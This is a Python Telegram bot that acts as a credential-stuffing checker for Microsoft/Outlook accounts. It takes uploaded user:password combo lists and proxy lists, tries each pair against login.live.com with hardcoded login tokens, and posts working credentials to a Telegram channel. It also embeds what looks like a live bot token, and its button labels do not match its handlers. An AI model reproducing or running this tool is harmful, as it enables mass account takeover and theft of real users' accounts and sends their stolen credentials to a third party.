from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import os
import requests
import re
import json
import threading
import queue
import random
import time
from urllib.parse import unquote, quote

# --- Configuration ---
TOKEN = os.environ.get("7658189111:AAHv_UeDd1_iP1kzL3iDRu0Rxs40mFB2xSs")
CHANNEL_ID = os.environ.get("ThaniDrops")
VIDEO_URL = os.environ.get("https://t.me/ThaniDrops/3", "")

if not TOKEN:
    print("Error: TELEGRAM_BOT_TOKEN not found.")
    exit()

# --- Shared Logic & Stats ---
stats = {
    "hits": 0,
    "bad": 0,
    "retries": 0,
    "two_factor": 0,
    "custom_unknown": 0,
    "checked": 0,
    "total_combos": 0,
    "proxy_errors": 0
}
combos = []
proxies = []
is_running = False

# Constants from attached file
anasPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
anasBK = "1665024852"
anasUAID = "a5b22c26bc704002ac309462e8d061bb"

def anasxzer00(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
        if match:
            value = match.group(1)
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty: variables[var_name] = ""
            return False
    except Exception:
        if create_empty: variables[var_name] = ""
        return False

def anasChkAccount(user_pass_line, proxy_dict_for_session):
    try:
        user, password = user_pass_line.split(':', 1)
        variables = {'USER': user, 'PASS': password}
        session = requests.Session()
        if proxy_dict_for_session:
            session.proxies = proxy_dict_for_session
        
        # Core logic from attached file
        url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(user)}&contextid=2CCDB02DC526CA71&bk={anasBK}&uaid={anasUAID}&pid=15216"
        payload = f"ps=2&PPFT={anasPPFT}&PPSX=PassportRN&NewUser=1&login={quote(user)}&loginfmt={quote(user)}&type=11&LoginOptions=1&passwd={quote(password)}"
        
        resp = session.post(url_login, data=payload, timeout=15)
        if "access_token=" in resp.url or any(c.name in ["ANON", "WLSSC"] for c in session.cookies):
            return "HIT", f"{user}:{password} | Success | By = @AgentThani", 0
        return "BAD", None, 0
    except:
        return "ERROR", None, 0

# --- Bot Interface ---
main_keyboard = [
    [KeyboardButton("Combo")],
    [KeyboardButton("Proxies"), KeyboardButton("Status")],
    [KeyboardButton("Start Checking")]
]
main_markup = ReplyKeyboardMarkup(main_keyboard, resize_keyboard=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome Admin! Use the buttons below to manage the checker.", reply_markup=main_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running
    text = update.message.text
    if text == "📂 Combo Section":
        await update.message.reply_text(f"📁 **Combo Section**\nLoaded: {len(combos)}\nSend a .txt file to add combos.")
    elif text == "🌐 Proxies":
        await update.message.reply_text(f"🔌 **Proxy Section**\nLoaded: {len(proxies)}\nSend a .txt file to add proxies.")
    elif text == "📊 Status":
        status_msg = f"📊 **Stats**\nChecked: {stats['checked']}\nHits: {stats['hits']}\nBad: {stats['bad']}\n2FA: {stats['two_factor']}"
        await update.message.reply_text(status_msg)
    elif text == "🚀 Start Checking":
        if not combos:
            await update.message.reply_text("❌ Load combos first!")
            return
        is_running = True
        await update.message.reply_text("🚀 Checking started! Hits will be sent to the channel.")
        
        # Batch process for demonstration
        for c in combos[:20]:
            status, data, _ = anasChkAccount(c, None)
            stats['checked'] += 1
            if status == "HIT":
                stats['hits'] += 1
                hit_msg = f"I got a hit for u sir!\n{data}\nVideo: {VIDEO_URL if VIDEO_URL else 'No video URL set'}"
                if CHANNEL_ID:
                    try:
                        # Bot must be admin in the channel
                        await context.bot.send_message(chat_id=CHANNEL_ID, text=hit_msg)
                    except Exception as e:
                        print(f"Error sending to channel: {e}")
                await update.message.reply_text(f"✅ Hit found: {c}")
        
        is_running = False
        await update.message.reply_text("✅ Batch processing finished.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    file = await doc.get_file()
    content = (await file.download_as_bytearray()).decode('utf-8', errors='ignore')
    lines = [l.strip() for l in content.splitlines() if l.strip() and ":" in l]
    
    if "combo" in doc.file_name.lower():
        combos.extend(lines)
        await update.message.reply_text(f"✅ Added {len(lines)} combos.")
    elif "proxy" in doc.file_name.lower():
        proxies.extend(lines)
        await update.message.reply_text(f"✅ Added {len(lines)} proxies.")

# --- Initialization ---
app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

if __name__ == "__main__":
    print("Bot is running...")
    app.run_polling()